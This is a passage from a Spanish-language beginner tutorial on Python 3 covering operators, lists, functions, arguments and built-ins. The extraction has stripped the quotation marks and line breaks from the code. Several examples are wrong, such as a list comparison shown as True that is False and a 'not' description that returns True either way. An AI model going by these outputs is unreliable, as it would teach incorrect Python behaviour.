usen técnicas estadísticas. Un número complejo esta formado por 2 componentes distintos: una parte real y una parte imaginaria. En Python3 podemos definir un numero complejo, se define la parte real seguida de un símbolo + y la parte imaginaria terminando con la letra j. numero = 2 + 4jprint(numero)(2+4j)numero. real2. 0numero. imag4. 0Comentarios #Los comentarios son parte fundamental en cualquier lenguaje de programación. Permiten describir partes del código que desarrollamos de manera que sea mucho más facil de comprender. Poner comentarios en nuestro código es una muy buena práctica que debemos realizar. La manera más simple de poner comentarios en Python3 es utilizando el símbolo # # Este es mi comentarioPodemos hacer lo mismo despues de escribir una sentencia en nuestro codigo haciendo referencia al significado de esta: variable =  Hola Python3  # Esto es una variableComentarios de varias lineas: Hay ocasiones en que necesitemos poner comentarios de varias líneas. Python3 no permite crear un comentario de varias líneas utilizando el mismo símbolo #. # Este comentario# tiene varias lineas# para mi ejemplo en Python3Existe una manera mas sencilla y comoda de hacer comentarios en Python3 con el uso de     todo el comentario    .    Este comentariotiene varias líneaspara mi ejemplo en Python3   Operadores Aritmeticos #A continuación se muestran los operadores aritméticos soportados por Python3:       Operador   Significado         a + b   suma       a - b   resta       a * b   multiplicacion       a / b   division       a % b   modulo       a // b   division de enteros       a ** b   exponencial   Suma y Resta: Los operadores suma +y resta - se pueden aplicar a distintos tipos de datos. Sumar y restar datos numericos: Al sumar o restar tipos de datos numericos obtenemos el resultado matematico. numero1 = 10numero2 = 8print(numero1 + numero2)18print(numero1 - numero2)8print(numero2 - numero1)-2numero3 = 2. 5numero4 = 1. 5print(numero3 + numero4)4. 0print(numero3 - numero4)1. 0Sumar y restar datos strings: Cuando sumamos tipos de datos strings se concatenan las variables. texto1 =  Hola texto2 =  Python print(texto1 + texto2)'HolaPython'Si queremos agregar un espacio, debemos agregar una cadena vacia    , sin embargo no podemos restar dichas cadenas. print(text1 +     + text2)'Hola Python'print(texto1 - texto2)---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-16-ed11b0c86524&gt; in &lt;module&gt;----&gt; 1 texto1 - texto2TypeError: unsupported operand type(s) for -: 'str' and 'str'Multiplicación y División: Los operadores de multiplicacion * y division / son operadores binarios que pueden aplicarse sobre distintos tipos de datos. multiplicar y dividir datos numericos: numero1 = 20numero2 = 4numero1 * numero280# IMPORTANTE: El resultado al dividir siempre es un floatprint(numero1 / numero2)5. 0multiplicar y dividir datos strings: No podemos multiplicar o dividir cadenas de texto. texto1 =  Hola texto2 =  Python texto1 * texto2---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-21-4d766fa04d9a&gt; in &lt;module&gt;----&gt; 1 texto1 * texto2TypeError: can't multiply sequence by non-int of type 'str'print(texto1 / texto2)---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-22-7ba20b66d6c5&gt; in &lt;module&gt;----&gt; 1 texto1 / texto2TypeError: unsupported operand type(s) for /: 'str' and 'str'Pero si podemos multiplicar una cadena de texto por un numero entero, que imprime el numero de veces de la cadena segun el que numero por el que multiplicamos. texto1 * 3'HolaHolaHola'Modulo: El operador modulo % es un operador binario que devuelve el resto de una división entre tipos de datos numericos ya sean enteros o flotantes. numero1 = 10numero2 = 7print(numero1 % numero2)3print(numero2 % numero1)7numero1 = 10. 5numero2 = 7. 2print(numero1 % numero2)3. 3Exponencial: El operador exponencial ** es un operador binario que se aplica solo en tipos de datos numéricos. numero1 = 5numero1 ** 225numero ** 3125texto1 =  Hola Python texto1 ** 2---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-33-a3cd4ee7680f&gt; in &lt;module&gt;----&gt; 1 texto1 ** 2TypeError: unsupported operand type(s) for ** or pow(): 'str' and 'int'Division Entera: El operador divison entera //es un operador binario que se aplica sobre tipos de datos numéricos y devuelve la parte entera del resultado. numero1 = 10numero2 = 7print(numero1 / numero2)1. 4285714285714286print(numero1 // numero2)1Operadores de Asignación #Anteriormente ya hemos usado el operador de asignación = para asignar un valor a una variable. Sin embargo Python3 nos proporciona un mecanismo para combinar operadores aritméticos y operadores de asignación simplificando nuestro codigo. Esa combinación se denomina Augmented Assignment.       Operador       Significado         a += 4   es igual a   a = a + 4       a -= 8   es igual a   a = a - 8       a *= 10   es igual a   a = a * 10       a /= 5   es igual a   a = a / 5   Veamos unos ejemplos: numero = 15numero += 5print(numero)20numero2 = 20numero2 *= 2print(numero2)40numero3 = 8numero3 -= 3print(numero3)5Booleanos #Los tipos de datos Boolenos en Python se representan con el tipo bool y reciben únicamente dos posibles valores:  True Fasevariable = Trueprint(variable)TruePodemos usar la funcion reservada type para ver el tipo de variable variable = Truetype(varaible)boolvariable2 = Falsetype(variable2)boolUna cosa a tener en cuenta es que las palabras True y False son palabras reservadas dentro de Python3 y no se les puede asignar ningún valor. True =  Hola Python  File  &lt;ipython-input-7-31dbcec71c48&gt; , line 1  True =  Hola Python   ^SyntaxError: cannot assign to TrueOperadores de Comparación #Son los que evalúan la relación que existe entre dos valores en Python. Existen diferentes tipos:       Operador   Ejemplo   Significado         ==   a == b   Igual a       !=   a != b   No igual a       &lt;   a &lt; b   Menor que       &lt;=   a &lt;= b   Menor que o igual a       &gt;   a &gt; b   Mayor que       &gt;=   a &gt;= b   Mayor que o igual a   Comparación entre datos numericos: A continacion veremos algunos ejemplos numero1 = 4numero2 = 8numero1 == 4Truenumero1 == numero2Falsenumero1 == 4. 0Truenumero1 != 4Falsenumero1 != numero2TrueOtros ejemplos numero1 = 10numero2 = 15numero1 &lt; numero2Truenumero2 &lt; numero1Falsenumero1 &lt;= 10. 0TrueComparación entre datos strings: texto1 =  cadena de texto texto2 =  cadena de texto 2 texto1 ==  cadena de texto Truetext1 == text2Falsetext1 != text2TrueAhora veamos un tipo de comparación mas inusual texto1 =  Cadena de mi texto texto2 =  texto texto1 &lt; texto2TruePodemos ver algo muy extraño  Esta comparación utiliza un orden lexicográfico: primero se comparan los dos primeros elementos, y si estos son diferentes, determina el resultado de la comparación; si son iguales, se comparan los dos siguientes elementos, y así sucesivamente, hasta que se agote cualquiera de las dos secuencias. y ahora se preguntaran si segun el principio tenemos arriba como primer caracter de texto1 -&gt; C y de texto2 -&gt; t como entonces lo esta haciendo? Pues esto es por la sencilla razon de que esta comparacion lo realiza utilizando los equivalentes numericos de cada caracter, esto mediante la funcion reservada ord()que recibe un caracter y se encarga de transformar un caracter a codigo unicode. Veamoslo mejor con el ejemplo anterior: #texto1 =  Cadena de mi texto #texto2 =  texto #condicion texto1 &lt; texto2 Cadena de mi texto  &lt;  texto True#Cojemos los primeros caracteres de ambas variables y les aplicamos la funcion ord()ord('C')67ord('t')116#tendriamos que C = 67 y t = 11667 &lt; 116TrueDespues de analizar el ejemplo anterior, efectivamente vemos que la condicion era cierta y ahora nos queda claro como es que funciona. Operadores de Identidad #Los operadores de identidad se utilizan para comparar objetos. Sin embargo, no comparan si los objetos son iguales, en su lugar, comparan si son el mismo objeto:       Operador   Ejemplo   Significado         is   x is y   Devuelve True si las dos variables son el mismo objeto       is not   x is not y   Devuelve `True si las dos variables no son el mismo objeto   Veamoslo mejor en un caso practico: tenemos dos variables: texto1 =  Hola Python text2 =  Hola Python Vemos que ambas variables tienen el mismo valor, pero si aplicamos la funcion reservada id() en cada variable nos da un valor diferente. id(texto1)140608469061488id(texto2)140608469060976Te preguntaras a que corresponde el valor que nos muestra despues de aplicar la funcion; pues el resultado viene a ser el valor de la porcion de memoria que se le asigna a esa variable en ese preciso momento, ya que si volvemos a crear la misma variable con el mismo valor de nuevo nos mostrara un valor diferente. texto1 =  Hola Python id(texto1)140608469400944Ahora aplicaremos la comparacion de indentidad a nuestras dos variables previamente creadas: texto1 is texto2Falsetexto1 == texto2TrueEn el resultado podemos apreciar que is nos devuelve False a diferencia de cuando aplicamos == que nos devuelve True: Esto se debe a que == solo nos compara que las variables contengan el mismo valor, pero el is nos compara que ambas variables sean el mismo objeto creado en la misma porcion de memoria en otras palabras si tienen el mismo identificador que nos mostraba la funcion id(). Como en el caso siguente que crearemos una nueva variable texto3 y la igualaremos a la anterior variable que creamos texto1, en este caso la variable texto3 heredara todo de la variable texto1 esto incluye la porcion de memoria en la que se creo. Por lo tanto a la hora de ejecutar nuevamente el operador de identidad is esta vez nos dara el valor de True. texto3 = texto1texto3 is texto1TrueOperadores de Pertenencia #: Los operadores de pertenencia se utilizan para evaluar sin una secuencia se encuentra presente en un objeto.       Operador   Ejemplo   Significado         in   x in y   Devuelve True si la secuencia x se encuntra presente en y, de lo contrario devuelve False       not in   x not in y   Devuelve True si la secuencia x no se encuentra en y, de lo contrario devuelve False   Veamoslo en un ejemplo: Obervamos que si la secuencia en este caso cadena esta presente en la variable texto, esto nos responde True ya que solo debe incluirse para que se cumpla esta condicion. texto =  Mi cadena de texto  cadena  in textoTrue hola  in textoFalse e  in textTruePero si intentamos hacer el mismo proceso en un numero entero, recibimos un error ya que el operador in solo sirve para secuencias que son iterables num = 13456781 in numero---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-7-882699b1f88c&gt; in &lt;module&gt;----&gt; 1 1 in numeroTypeError: argument of type 'int' is not iterableOperadores Logicos #: Los operadores lógicos modifican y unen expresiones evaluadas en contexto booleano para crear condiciones más complejas.       Operador   Ejemplo   Significado         not   not x   Devuelve True si x el False, de lo contrario devuelve True       or   x or y   Devuelve True si x o y son True, de lo contrario devuelve False       and   x and y   Devuelve True si ambos x como y son True, de lo contrario devuelve False   Operador not: Evaluamos la expresion y con not invierte el valor que nos devuelve una expresion numero = 10numero &lt; 20Truenot numero &lt; 20FalseOperador or: Observamos que el resultado nos devuelve True, puesto que si bien la primera condicion es False, con el uso del operador or solo necesita devolver una de ellas True, concretamente ya que la segunda condicion si se cumplia. numero1 = 10numero2 = 20numero1 &lt; 5Falsenumero1 &lt; 5 or numero2 &gt; 10TrueOperador and: El operador and si requiere que se cumpla la evaluacion de todas las expresiones para que devuelva un valor True numero1 = 5numero2 = 10numero1 &lt; 8 and numero2 &gt; 15Falsenumero1 &lt; 10 and numero2 &gt; 7TrueListas #Las listas son un tipo de dato complejo y particular en Python3. Una lista se corresponde con una colección arbitraria de objetos. Las listas son similares a estructuras conocidas como arrays en otros lenguajes de programación pero con la diferencia de que en Python3 aportan mas flexibilidad. En Python3 se representan con el tipo list y la sintaxis que se utiliza para definirlas consiste en indicar una lista de objetos separados entre comas y encerrados entre corchetes: [objeto1, objeto2, …, objeton] Veamoslo de manera practica  Podemos una lista con datos numericos. lista = [1, 2, 3, 4, 5]type(lista)listprint(lista)[1, 2, 3, 4, 5] Tambien crear una lista con tipo de datos stringlista2 = [ texto1 ,  texto2 ,  texto3 ]type(lista2)listprint(lista2)['texto1', 'texto2', 'texto3']Vemos que tenemos una lista igual a la anterior pero con la diferencia que esta contiene cadenas de texto.  El orden en el que se especifican los elementos cuando se define una lista es relevante y se mantiene durante toda su vida. lista = ['n1', 'n2', 'n3']print(lista)['n1', 'n2', 'n3'] Podemos comparar las listas con los operadores mencionados anteriormente. lista1 = ['n1', 'n2', 'n3']lista2 = ['n2', 'n1', 'n3']lista1 == lista2False'n1' in lista2Truelista1 in lista2Falselista1 == ['t1', 't2', 't3']Truelista1 is lista2False Las lista pueden contener distintos tipos de datos. lista = [1, 2,  hola ,  python ]print(lista)[1, 2, 'hola', 'python'] Una cosa super interesante es que una lista puede contener una función estas las veremos mas adelante pero es importante mantenerlo presente def funcion():  print( Hola python )lista = [ texto1 ,  texto2 , funcion]print(lista)['texto1', 'texto2', &lt;function funcion at 0x0000012D476D0EE0&gt;]Acceso a elementos de una lista: Todas las variaciones vistas en la sección de strings (indexing, slicing, stride) aplican a las listas. indexing: lista = [ texto1 ,  texto2 ,  texto3 ,  texto4 ,  texto5 ]lista[0]'texto1'lista[-1]'texto5'slicing: lista = [ texto1 ,  texto2 ,  texto3 ,  texto4 ,  texto5 ]lista[2:4]['texto3', 'texto4']lista[:3]['texto1', 'texto2', 'texto3']lista[2:]['texto3', 'texto4', 'texto5']stride: lista = [ texto1 ,  texto2 ,  texto3 ,  texto4 ,  texto5 ]lista[0:4:2]['texto1', 'texto3' otra cosa interesante es que podemos utilizar el concepto de stride para darle la vuelta a una lista lista['texto1', 'texto2', 'texto3', 'texto4', 'texto5']lista[::-1]['texto5', 'texto4', 'texto3', 'texto2', 'texto1'] Una de las pocas construcciones sintácticas en cuanto a la indexación que cambia entre los strings y las listas es [:].  Cuando lo usamos nos devuelve una referencia al propio objetotexto =  Hola python texto[:]'Hola python'texto[:] is textoTrue Al utilizarlo con una lista nos devuelve una copia del objetivo -&gt; ojo no el mismo. lista = [1, 2, 3, 4]lista[:][1, 2, 3, 4]lista[:] is listaFalseOperaciones con listas: Las listas soportan muchos de los operadores y funciones de Python como los que vimos anteriormente. Al sumar las listas estas se anidan lista1 = [1, 2, 3]lista2 = [4, 5, 6]lista1 + lista2[1, 2, 3, 4, 5, 6]Cuando usamos el operador de multiplicación, esto hace que se multipliquen sus mismos valores segun el numero por el cual se le multiplique. lista1 = [1, 2, 3]lista1 * 2[1, 2, 3, 1, 2, 3]Tambien podemos ver la longitud, el valor minimo y el maximo de una lista lista1 = [1, 2, 3]lista2 = [4, 5, 6]len(lista1)3min(lista1)1max(lista2)6Solo podemos hacer operaciones entre listas, ya que si tratamos de hacer operaciones con otros tipos en este caso un numero int nos arrojara un error. [1, 2, 3] + 4---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-95-5842ff442cc5&gt; in &lt;module&gt;----&gt; 1 [1, 2, 3] + 4TypeError: can only concatenate list (not  int ) to listListas anidadas: Como mencionamos anteriormente, una lista puede contener cualquier tipo de objeto. Esto incluye otra lista. Una lista puede contener sublistas, que a su vez pueden contener sublistas, y así sucesivamente. lista = [1, [2, [3, 4], 5], 6]lista[0]1lista[1][2, [3, 4], 5]Si queremos acceder a un elemento de una sublista usaremos [][] lista = [1, [2, [3, 4], 5], 6]lista[1][0]2lista[1][1][3, 4]lista[1][1][0]3 Podemos anidar tantas listas como nuestro sistema soporte Es importante mencionar que si usamos operadores en una lista con sublistas anidadas, estos solo se aplicaran a la primera, no lo haran de forma recursiva, y se deseariamos usarlos debemos aplicar el concepto de indexing lista = [1, [2, [3, 4], 5], 6][3, 4] in listaFalselista[1][2, [3, 4], 5][3, 4] in lista[1]TrueLas listas son mutables: Al contrario que los strings, los elementos de las listassi pueden modificarse lista = [ texto1 ,  texto2 ,  texto3 ]lista[0]'texto1'lista[0] =  texto4 lista['texto4', 'texto2', 'texto3']Si queremos tambien podemos eliminar elementos una lista lista = [ texto1 ,  texto2 ,  texto3 ]del lista[0]lista['texto2', 'texto3']Para realizar estas modificaciones tambien podemos usar los conceptos del indexing, slicing y stride. lista['texto1', 'texto2']lista += [ texto3 ,  texto4 ,  texto5 ]lista['texto1', 'texto2', 'texto3', 'texto4', 'texto5']lista[0:3]['texto1', 'texto2', 'texto3']lista[0:3] = [1, 2, 3]lista[1, 2, 3, 'texto4', 'texto5']Otra cosa interesante es que el numeros de elementos seleccionados no tiene que ser igual a los que se asigne lista[0:3][1, 2, 3]lista[0:3] = [1, 2]lista[1, 2, 'texto4', 'texto5']lista[2:2] = [3, 4, 5]lista[1, 2, 3, 4, 5, 'texto4', 'texto5']lista[0:6] = []lista['texto5']Funciones #Antes de continuar con el contenido del curso se me hace necesario tocar ya el tema de funciones. Hemos visto distintos tipos de datos anteriormente, pero ahora vamos a profundizar en una de las estructuras principales de python que son las funciones. Una función va a consistir en un bloque de código que va encapsular una tarea específica o un grupo de tareas relacionadas. Las funciones nos permiten dividir programas complejos en fragmentos más pequeños y modulares, de manera que podamos volver a utilizar estos fragmentos de codigo en un momento determinado de modo tal que no tenemos que volver a implementarlo. En este caso vamos a invocar una función que ya viene definida en python. Concretamente una que ya vimos antes de nombre len. Vamos a comenzar declarando una variable y lo siguiente sera ver como podemos invocar una función. variable =  Hola Python Para invocar la función debemos de poner el nombre de la función y entre parentesis ponemos los argumentos de la función. Esta función lo que hara es ejecutar una serie de lineas de codigo que estan definidas en alguna parte de python y nos devuelve el numero de caracteres que contiene nuestra variable. len(variable)11Ahora el resultado que nos devuelve la función, podemos asignarlo a otra variable. len_variable = len(variable)print(len_variable)11La función que se muestra anterioremente forma parte de un conjunto de funciones que estan definidas en el interprete de Python y podemos utilizar siempre que lo necesitemos. Para utilizar estas funciones no necesitamos conocer el detalle del código fuente que la implementa, únicamente necesitamos conocer:  Los argumentos recibe la función Los valores que devuelveMas adelante veremos a detalle las funciones integradas de python. Funciones Personalizadas #: Para poder definir funciones en python la sintaxis utilizada es la siguiente: def &lt;nombre_funcion&gt;([&lt;parámetros&gt;]):  &lt;sentencia(s)&gt;Debemos comenzar utilizando la palabra clave def despues de un espacio ponemos el nombre_función que queremos definir y entre () los parametros que va a recibir nuestra función, la cual se va a traducir a los elementos que le vamos a proporcionar cuando la llamemos. El elemento, &lt;sentencia(s)&gt;, se denomina cuerpo de la función. El cuerpo es el bloque de sentencias en Python que se ejecutará cuando se llame a la función. Cabe mencionar que el cuerpo de una función de Python se define por la sangría. Vamos a comenzar definiendo nuestra función: def mi_funcion(argumento1, argumento2):  print(argumento1)  print(argumento2)Como podemos visualizar he definico una función de nombre mi_funcion que va a recibir 2 parametros argumento1 y argumento2 y el codigo que ejecutara sera con print imprimirme por pantalla primero el argumento1 y segundo el argumento2 Ahora para ejecutarla la función es super sencillo. La sintaxis debe ser la siguiente: &lt;nombre_funcion&gt;([&lt;argumentos&gt;]).  Cabe resaltar que Los &lt;argumentos&gt; son los valores que se pasan a la función. Se corresponden con los &lt;parámetros&gt; en la definición de la función que asignamos. Por lo tanto para llamar a la función, deberiamos hacerlo de la siguente manera: mi_funcion( Hola Python ,  Adios Python )Hola PythonAdios PythonEs importante mencionar que la ejecución de nuestro programa sera secuencial hasta que llegue a la función. Para entendero mejor, supongamos que estoy defiendo un programa: 1. - Primero, ejecutar un print(“Curso Python”)2. - Segundo, llamare a mi función antes declarada, no sin olvidar añadir los parametros que necesita3. - Tercero, volvere a ejecutar un print(“Aprende Python”) print( Curso Python )mi_funcion( Hola Python ,  Adios Python )print( Aprendere Python )Como resultado tendre que el interprete de python comenzara a ejecutar mi programa linea por linea. Curso PythonHola PythonAdios PythonAprendere Python Lo que quiero resaltar es que necesitamos crear funciones relacionadas con tareas especificas que realizen una acción particular, de tal modo que podamos volver a reutilizar. Bueno por si habia duda tambien se pueden definir funciones que no reciban ningún argumento, pero los paréntesis siempre seran necesarios. Tanto en una definición de función como una llamada a una función deben incluir siempre paréntesis, incluso si están vacíos. def mi_funcion2():  print( Hola Python )  print( Adios Python )De tal modo que para ahora llamar a mi función solo debo de poner el nombre de las función y los (). mi_funcion2()Hola PythonAdios PythonArgumentos de las Funciones #: Los argumentos que podemos proporcionarle a una función en Python pueden ser de diferentes tipos. Argumentos Posicionales: Como vimos anteriormente la forma más sencilla de pasar argumentos a una función en Python es con argumentos posicionales (llamados tambien argumentos requeridos). En la definición de la función, debe especificarse una lista de parámetros separada por comas dentro de los paréntesis. def mi_funcion(argumento1, argumento2, argumento3):  print(argumento1)  print(argumento2)  print(argumento3)Los argumentos que le proporcionamos en la invocación de la función debe respetar el orden y el número de parámetros definidos. mi_funcion( Hola Python ,  Adios Python ,  Grande Python )Hola PythonAdios PythonGrande PythonSi yo trato de llamar a la función, pero en lugar de pasarle los tres argumentos solo le paso dos. mi_funcion( Hola Python ,  Adios Python )---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-12-c560729c0eac&gt; in &lt;module&gt;----&gt; 1 mi_funcion( Hola Python ,  Adios Python )TypeError: mi_funcion() missing 1 required positional argument: 'argumento3'Como vemos lo que ocurre es que el interprete de python me dara un error, donde me dira que a la función que defini previamente con tres argumentos me ha faltado ponerle un elemento posicional correspondiente a argumento3. Ya que ha identificado un valor para argumento1 y argumento2, pero no para argumento3. Y como es un argumento posicional es obligatorio que ponga el mismo numero de argumentos como parametros definamos en nuestra función.  Los parámetros se comportan como variables que estan definidas de manera local a la función (únicamente en el cuerpo de la función). Cuando se invoca la función, los argumentos que se le proporcionan se asignan a los parámetros en el orden en el que estuvieran definidos. Esto quiere decir que los parametros que yo estoy poniendo en la definición de la función se van a comportar como variables dentro del cuerpo de la función, pero no fuera del cuerpo. Vamos a ver un ejemplo para entender esto mejor: Primero voy a definir una función que no recibira ningun argumento, lo que hara sera simplemente crear una variable var que le asignara una cadena de texto y me lo imprimira por pantalla. def mi_funcion():  var =  mi variable 'var' dentro de la funcion   print(var)Ahora voy a definir otra variable con el mismo nombre var fuera de la función y le voy a asignar una cadena de texto. Seguidamente llamara a mi función previamente creada y finalmente imprimire por pantalla la variable var. var =  variable 'var' fuera de mi función mi_funcionprint(var)Ahora al ejecutar esto lo que me muestra es: variable 'var' dentro de la funcionvariable 'var' fuera de la funcionComo podemos ver lo primero que me imprime el programa es variable 'var' dentro de la funcion y despues variable 'var' fuera de la funcion. Esto ocurre por que tanto los parametros y variables que definamos dentro de una función van a estar en el contexto local de esa función y no va a afectar a lo que hayamos definido fuera. Por ello aunque yo haya definido una variable con el mismo nombre, para python son variables diferentes ya que se encuentran en contextos diferentes, una dentro de la función y otra fuera de esta. Argumentos de Palabras Clave: Otra manera de invocar una función en Python es indicando los argumentos de la forma &lt;palabra clave&gt;=&lt;valor&gt;. En ese caso, cada &lt;palabra clave&gt; debe coincidir con un parámetro en la definición de la función. Veamoslo mejor en un ejemplo para entenderlo bien: Comencemos definiendo una función def mi_funcion(argumento1, argumento2):  print(argumento1)  print(argumento2)Lo siguiente que hare sera invocar la función pero en este caso le pasare argumentos de palabra clave en lugar de posicionales. Voy a definir dos variables variable1 =  Hola Python variable2 =  Adios Python Ahora llamare a mi función, pero en lugar de pasarle las variables como argumentos posicionales, que seria algo como mi_funcion(variable1, variable2). Lo que hare sera indicarle el nombre del parametro que quiero que este asociado con el argumento que le pase. mi_funcion(argumento1=variable1, argumento2=variable2)Hola PythonAdios PythonSi quisiera podria invertirlo y el resultado me lo sacaria alreves. mi_funcion(argumento1=variable2, argumento2=variable1)Adios PythonHola Python Una cosa que es importante sobre los argumentos de palabras clave es que no tenemos que respetar el orden de los parametros para pasarle los argumentos. Aunque en la definición de nuestra función pusimos como primer parametro argumento1 y segundo argumento2. Como yo le digo a que valor estan asignados, puedo cambiar el orden y no necesitamos que esten en el mismo orden que en la definición. mi_funcion(argumento2=variable1, argumento1=variable2)Adios PythonHola PythonOtra cosa que debemos tener en cuenta es que no podemos poner el nombre de un argumento que no se encuentre definido como parametro de la función mi_funcion(argumento1=variable1, argumento3=variable2)---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-17-96e6349729cf&gt; in &lt;module&gt;----&gt; 1 mi_funcion(argumento1=variable1, argumento3=variable2)TypeError: mi_funcion() got an unexpected keyword argument 'argumento3'Logicamente python me dara un error ya que el argumento3 no se encuentra en la definición de nuestra función. De la misma manera tenemos que respetar el numero de argumentos que le pasamos al invocar nuestra función. De otra manera este nos dara un error de que falta un argumento posicional. mi_funcion(argumento1=variable1)---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-20-c46543542516&gt; in &lt;module&gt;----&gt; 1 mi_funcion(argumento1=variable1)TypeError: mi_funcion() missing 1 required positional argument: 'argumento2' Otra de las cosas interesantes que nos permite hacer Python, es la combinación argumentos posicionales y de palabra clave en la misma llamada a una función. En estos casos, siempre los argumentos posicionales deben indicarse primero. def mi_funcion(argumento1, argumento2):  print(argumento1)  print(argumento2)variable1 =  Hola Python variable2 =  Adios Python mi_funcion(variable1, argumento2=variable2)Hola PythonAdios PythonComo podemos ver que efectivamente el programa se nos ejecuta correctamente. Pero ahora que pasa si yo pongo el segundo parametro comi posicional. mi_funcion(argumento1 = variable1, variable2)  mi_funcion(arg1=var, var2)               ^SyntaxError: positional argument follows keyword argumentPues esto me dara un error que me dira que hay un argumento posicional que sigue a un argumento de palabra clave. Entonces necesariamente tiene que ser alreves. Parametros con Valores por defecto: Si especificamos un parámetro en la definición de una función en Python utilizando la forma &lt;nombre&gt;=&lt;valor&gt;, entonces &lt;valor&gt; se convierte en un valor por defecto para ese parámetro. A eso denominamos parametros por defecto. Vamos a definir una función, donde le pasaremos dos parametros y que el segundo correspondera a uno por defecto. def mi_funcion(argumento1, argumento2= Valor por defecto ):  print(argumento1)  print(argumento2)Lo que me permite es jugar con el numero de argumentos que le paso a la función, ya que esta vez puedo pasarle menos argumentos de los que estan definidos al invocar a la función mi_funcion( Hola Python )Hola PythonValor por defectoLo que hace la función es decir que el primer argumento necesita si o si que me pase un valor, entonces como ya se lo pasamos, esto lo asignara a argumento1 y nos los sacara por pantalla este primer argumento. Ahora en lo que corresponde al segundo parametro si le pasamos algo lo asignara a argumento2, de lo contrario cogera el valor que tiene por defecto y como en este caso no le pasamos nada lo que hizo fue imprimirnos el valor por defecto. Pero si ahora yo le indico un valor. Como esta vez le estamos asignando un valor al argumento2, esta vez no necesitara el valor por defecto y por lo tanto lo descarta y imprimira el valor que le hayamos pasado. mi_funcion( Hola Python ,  Adios Python )Hola PythonAdios PythonSentencia Return: Las funciones en Python pueden retornar un valor despues de haber ejecutado las sentencias de código definidas. Para devolver un valor, se debe utilizar la palabra return dentro del cuerpo de la función. Ahora hay que tener en cuenta algunas cosas cuando utilizamos return:  Cuando se ejecuta return en Python, el intérprete termina inmediatamente la ejecución de la función y regresa a la línea de código desde dónde la hubiésemos invocado. Vamos a verlo en un ejemplo mas practico. Comenzamos definiendo una función simple donde ejecutaremos un print de un texto, despues usaremos la sentencia return y finalmente volveremos a ejecutar otro print. def mi_funcion():  print( Sentencia 1 dentro de mi funcion )  return  print( Sentencia 2 dentro de mi funcion )Ahora escribiremos codigo fuera de nuestra función, donde primero haremos un print, despues llamaremos a la función que creamos y finalmente usaremos otro print. print( Sentencia 1 fuera de mi funcion )mi_funcion()print( Sentencia 2 fuera de mi funcion )Al ejecutar esto lo que pasara es que se ejecutara la primera linea, despues ejecutara nuestra función, la cual tiene tres lineas donde se ejecutara la primera linea con normalidad, pero después en la segunda linea al estar la sentencia return, terminara la ejecución de nuestra función sin ejecutar la tercera linea y retornara la ejecución a donde se ejecuto la función y en consecuencia se ejecutara el print de la ultima linea. Sentencia 1 fuera de mi funcionSentencia 1 dentro de mi funcionSentencia 2 fuera de mi funcion Si definimos la palabra return de la forma return &lt;valor&gt; se retornará el &lt;valor&gt; especificado en la llamada a dicha función. def mi_funcion():  return  Valor de la funcion   print( Esta linea nunca podra ejecutarse )Esto nos permite que al invocar nuestra función podamos recibirla en una variable. Y lo que hara la función sera ejecutarme el return y devolverme el resultado en la variable mi_variable, que en consecuencia al imprimirla me deolvera la cadena de texto que esta asociada al return. Cabe mencionar que el print de la función no se ejecutara debido a que debemos recordar que el return termina la ejecución de la función mi_variable = mi_funcion()print(mi_variable)Valor de la funcionTambien podria ejecutar mi función sin asignarsela a ninguna variable. mi_funcion()Valor de la funcionOjito una cosa muy interesante tambien es que podria aplicar a esta función. Ya que nos devuelve una cadena de texto, podria aplicar conceptos como el de slide, slicing y stride mi_funcion()[0:5]Valor Si no indicamos el término &lt;valor&gt; en la sentencia return se devuelve un tipo de datos conocido como Nonedef mi_funcion():  returnvariable = mi_funcion()print(variable)None Podemos utilizar la sentencia return para devolver varios valores utilizando la sintaxis return &lt;valor1&gt;,&lt;valor2&gt;,. . . ,&lt;valorn&gt;Supongamos que definimos una función que queremos que retorne tres cadenas de texto. def mi_funcion():  return  texto1 , texto2 , texto3 Y cogeria estos valores, definiendo tres variables e igualandolas a la función variable1,variable2,variable3 = mi_funcion()Si ahora imprimo las variables print(var1)print(var2)print(var3)texto1texto2texto3Docstrings: Los docstring los utilizamos para proporcionar la documentación de una función. Como el propósito de la función, los argumentos que va a tomar, información sobre los valores de retorno, o cualquier otra información que consideremos útil. Cuando la primera declaración en el cuerpo de una función en Python es un string de la forma    texto   , esto es lo que se conoce como docstring. Aqui tenemos un ejemplo de como lo podemos definir: def mi_funcion():     Esto es un docstring de nuestra función     print( Hola Python )Tambien podemos definir docstring de varias lineas. def mi_funcion2(argumento1=4, argumento2=8):     Este es un docstring de varias líneas.   Argumentos:  argumento1 -- primer argumento de la funcion (valor por defecto 4)  argumento2 -- segundo argumento de la funcion (valor por defecto 8)       returnFunciones Propias de Python: El intérprete de Python tiene una serie de funciones que están siempre disponibles. A continuación se enumeran en orden alfabético.               Lista de Funciones                 abs()   delattr()   hash()   memoryview()   set()       all()   dict()   help()   min()   setattr()       any()   dir()   hex()   next()   slice()       ascii()   divmod()   id()   object()   sorted()       bin()   enumerate()   input()   oct()   staticmethod()       bool()   eval()   int()   open()   str()       breakpoint()   exec()   isinstance()   ord()   sum()       bytearray()   filter()   issubclass()   pow()   super()       bytes()   float()   iter()   print()   tuple()       callable()   format()   len()   property()   type()       chr()   frozenset()   list()   range()   vars()       classmethod()   getattr()   locals()   repr()   (zip)       compile()   globals()   map()   reversed()   __import__()       complex()   hasattr()   max()   round()       Estas son todas las funciones disponibles que estan integradas en python. A continuación veremos algunas de las mas importantes, pero no esta de mas practicar para ver de que trata cada una de ellas. Comenzaremos con la función help que se utiliza para mostrar la documentación de un objeto. Si la invocamos sin asignarle ningun objeto y me saldra una sesión interactiva donde podemos introducir algo sobre lo que queremos saber su información, en este caso introduciremos len. help()Welcome to Python 3. 10's help utility!If this is your first time using Python, you should definitely check outthe tutorial on the Internet at https://docs. python. org/3. 9/tutorial/. Enter the name of any module, keyword, or topic to get help on writingPython programs and using Python modules.  To quit this help utility andreturn to the interpreter, just type  quit . To get a list of available modules, keywords, symbols, or topics, type modules ,  keywords ,  symbols , or  topics .  Each module also comeswith a one-line summary of what it does; to list the modules 